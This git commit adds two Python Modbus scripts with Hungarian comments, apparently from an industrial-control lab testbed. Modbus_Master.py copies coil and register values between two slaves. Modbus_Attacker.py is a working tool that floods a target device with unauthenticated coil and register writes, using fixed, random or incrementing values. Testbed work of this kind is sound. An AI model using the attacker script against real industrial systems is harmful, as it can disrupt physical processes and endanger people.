dd02cbd5e9457d147b7cb235466de3db3d6151ad
TothGergelyGy <50365016+TothGergelyGy@users.noreply.github.com>
2021-11-22 00:44:33 +0100

    Modbus Master és Attacker

---
+++ Modbus_Attacker.py
@@ -0,0 +1,117 @@
+import sys,json,time
+from pyModbusTCP.client import ModbusClient
+import random
+
+def cont_func(target_type,target_IP,target_Port,value=-1): #fix idokozonkent ugyanarra a cimre kuld
+    Target=ModbusClient(target_IP,target_Port)
+    print("celcim:")
+    address=int(input())
+    print("idozites mp-ben:")
+    timing=float(input())
+    if value==-1:#random ertek mod
+        if target_type=="coil":
+            while True:
+                n=random.randint(0,1)
+                Target.open()
+                Target.write_single_coil(address,n)
+                Target.close()
+                time.sleep(timing)
+                print("random ertek: "+str(n)+" elkuldve "+str(address)+" cimre")
+        elif target_type=="register":
+            while True:
+                n=random.randint(0,2**16)
+                Target.open()
+                Target.write_single_register(address,n)
+                Target.close()
+                time.sleep(timing)
+                print("random ertek: "+str(n)+" elkuldve "+str(address)+" cimre")
+    else:#fix ertek mod
+        if target_type=="coil":
+            while True:
+                Target.open()
+                Target.write_single_coil(address,int(value))
+                Target.close()
+                time.sleep(timing)
+                print("fix ertek: "+str(value)+" elkuldve "+str(address)+" cimre")
+        elif target_type=="register":
+            while True:
+                Target.open()
+                Target.write_single_register(address,int(value))
+                Target.close()
+                time.sleep(timing)
+                print("fix ertek: "+str(value)+" elkuldve "+str(address)+" cimre")
+    
+
+def single_func(target_type,target_IP,target_Port):
+    Target=ModbusClient(target_IP,target_Port)
+    print("celcim:")
+    address=int(input())  
+    if target_type=="coil":
+        while True:
+            print("ertek, valid 0 es 1:")
+            value=int(input())
+            Target.open()
+            Target.write_single_coil(address,value)
+            Target.close()
+            print("ertek: "+str(value)+" elkuldve "+str(address)+" cimre")
+    elif target_type=="register":
+        while True:
+            print("ertek, valid 0 es 65 536 kozott:")
+            value=int(input())
+            Target.open()
+            Target.write_single_register(address,value)
+            Target.close()
+            print("ertek: "+str(value)+" elkuldve "+str(address)+" cimre")
+
+
+def counter_func(target_IP,target_Port):
+    Target=ModbusClient(target_IP,target_Port)
+    print("celcim:")
+    address=int(input())
+    print("max ertek ameddig menjen:")
+    maxvalue=int(input())
+    print("idozites mp-ben:")
+    timing=float(input())
+    for x in range(0, maxvalue+1):
+        Target.open()
+        Target.write_single_register(address,x)
+        Target.close()
+        print("novekvo ertek: "+str(x)+" elkuldve "+str(address)+" cimre")
+        time.sleep(timing)
+
+
+
+#sys.argv bemenet: target.ip target.port 
+print("Modbus Attacker elindult")
+target_IP=sys.argv[1]
+target_Port=int(sys.argv[2])
+#target=ModbusClient(target_IP,target_Port)
+
+print("continous: folyamatosan kuldi az uzeneteket egy celcimre")#ebbol van fix ertekes es random
+print("single: egy uzenetet kuld egy cimre")#egy fix erteket egyszer elkuld, ujra kerdezi mit kuldjon
+print("counter: a megadott celig novekvo erteku uzeneteket kuld, csak egy registerre van ertelmezve")
+mode=input() 
+print("coil: coilt(1 db bit) fog atirni, igaz-hamis ertekekben")
+print("register: registert(16 bit) fog atirni 0tol 65 536ig")
+target_type=input()
+
+
+if mode=="continous":
+    print("fix: ugyanazt az erteket kuldi")
+    print("random: veletlenszeru erteket kuld az uzenetben")
+    submode=input()   
+    if submode=="fix":
+        print("ertek:")
+        value=input()
+        cont_func(target_type,target_IP,target_Port,value)#ezen belul kerdezi a coil/reg celcimet
+    elif submode=="random":
+        cont_func(target_type,target_IP,target_Port)
+elif mode=="single":
+    print()
+    single_func(target_type,target_IP,target_Port)
+elif mode=="counter":#nem is ellenorizzuk hogy mi a target type mert csak register lehet
+    print()
+    counter_func(target_IP,target_Port)
+
+#random.randint(0,2**16) registerre
+#random.randint(0,1) boolra 
---
+++ Modbus_Master.py
@@ -0,0 +1,135 @@
+import sys,json,time
+from pyModbusTCP.client import ModbusClient
+import random
+#sys.argv bemenet: slave1.ip slave1.port slave2.ip slave2.port
+print("Modbus Master elindult")
+    
+Slave1_IP=sys.argv[1]
+Slave1_Port=int(sys.argv[2])
+Slave2_IP=sys.argv[3]
+Slave2_Port=sys.argv[4]
+Slave1=ModbusClient(Slave1_IP,Slave1_Port)
+Slave2=ModbusClient(Slave2_IP,Slave2_Port)
+timing=0.5
+
+
+#Input register 	Read-only   16 bits
+#Holding register 	Read-write  16 bits
+print("coil:coilt olvas es ir")
+print("h_register:holding registert olvas es ir")
+print("i_register:input registert olvas es holding registerbe ir")
+print("all:coilt olvas es ir, majd holding registert olvas es ir")
+mode=input() 
+
+
+
+if mode=="coil":
+    print("Olvasas kezdo bit cime:")
+    read_from=int(input())
+    print("Olvasas utolso bit cime(amit mar nem olvas):")
+    read_until=int(input())
+    print("Iras kezdo bitje:")
+    write_from=int(input())
+    write_until=write_from+(read_until-read_from)
+    while True:
+        for x in range(read_from, read_until):
+            Slave1.open()
+            y=Slave1.read_coils(x,1) #az y egy bool lista
+            Slave1.close()
+            print("coil ertek "+str(x)+": "+str(y))
+            if y==None:
+               print("Nem tudott olvasni")
+            Slave2.open()
+            Slave2.write_multiple_coils((write_from+x-read_from),y) #azert nem write_single_coil mert bool listat ad vissza a read
+            Slave2.close()
+            time.sleep(timing)  
+
+          
+          
+elif mode=="h_register":
+    print("Olvasas kezdo bit cime:")
+    read_from=int(input())
+    print("Olvasas utolso bit cime(amit mar nem olvas):")
+    read_until=int(input())
+    print("Iras kezdo bitje:")
+    write_from=int(input())
+    write_until=write_from+(read_until-read_from)
+    while True:
+        for x in range(read_from, read_until, 2):
+            Slave1.open()
+            y=Slave1.read_holding_registers(x,1) #az y egy lista
+            Slave1.close()
+            print("holding register ertek "+str(x)+": "+str(y))
+            if y==None:
+               print("Nem tudott olvasni")
+            Slave2.open()
+            Slave2.write_multiple_registers((write_from+x-read_from),y)
+            Slave2.close()
+            time.sleep(timing)   
+          
+          
+            
+elif mode=="i_register":#read only, holdingba kell irni
+    print("Olvasas kezdo bit cime:")
+    read_from=int(input())
+    print("Olvasas utolso bit cime(amit mar nem olvas):")
+    read_until=int(input())
+    print("Iras kezdo bitje:")
+    write_from=int(input())
+    write_until=write_from+(read_until-read_from)
+    while True:
+        for x in range(read_from, read_until, 2):
+            Slave1.open()
+            y=Slave1.read_input_registers(x,1) #az y egy int lista
+            Slave1.close()
+            print("input register ertek "+str(x)+": "+str(y))
+            if y==None:
+               print("Nem tudott olvasni")
+            Slave2.open()
+            Slave2.write_multiple_registers((write_from+x-read_from),y)
+            Slave2.close()
+            time.sleep(timing) 
+    
+    
+    
+elif mode=="all":#coil es holding register is
+    print("Coil olvasas kezdo bit cime:")
+    coil_read_from=int(input())
+    print("Coil olvasas utolso bit cime(amit mar nem olvas):")
+    coil_read_until=int(input())
+    print("Coil iras kezdo bitje:")
+    coil_write_from=int(input())
+    coil_write_until=coil_write_from+(coil_read_until-coil_read_from)
+    
+    print("Holding register olvasas kezdo bit cime:")
+    reg_read_from=int(input())
+    print("Holding register olvasas utolso bit cime(amit mar nem olvas):")
+    reg_read_until=int(input())
+    print("Holding register iras kezdo bitje:")
+    reg_write_from=int(input())
+    reg_write_until=reg_write_from+(reg_read_until-reg_read_from)
+    
+    while True:
+        for x in range(coil_read_from, coil_read_until):
+            Slave1.open()
+            y=Slave1.read_coils(x,1) #az y egy bool lista
+            Slave1.close()
+            print("coil ertek "+str(x)+": "+str(y))
+            if y==None:
+               print("Nem tudott olvasni")
+            Slave2.open()
+            Slave2.write_multiple_coils((coil_write_from+x-coil_read_from),y)
+            Slave2.close()
+            time.sleep(timing)  
+        
+        for x in range(reg_read_from, reg_read_until, 2):
+            Slave1.open()
+            y=Slave1.read_holding_registers(x,1) #az y egy int lista
+            Slave1.close()
+            print("holding register ertek "+str(x)+": "+str(y))
+            if y==None:
+               print("Nem tudott olvasni")
+            Slave2.open()
+            Slave2.write_multiple_registers((reg_write_from+x-reg_read_from),y)
+            Slave2.close()
+            time.sleep(timing)
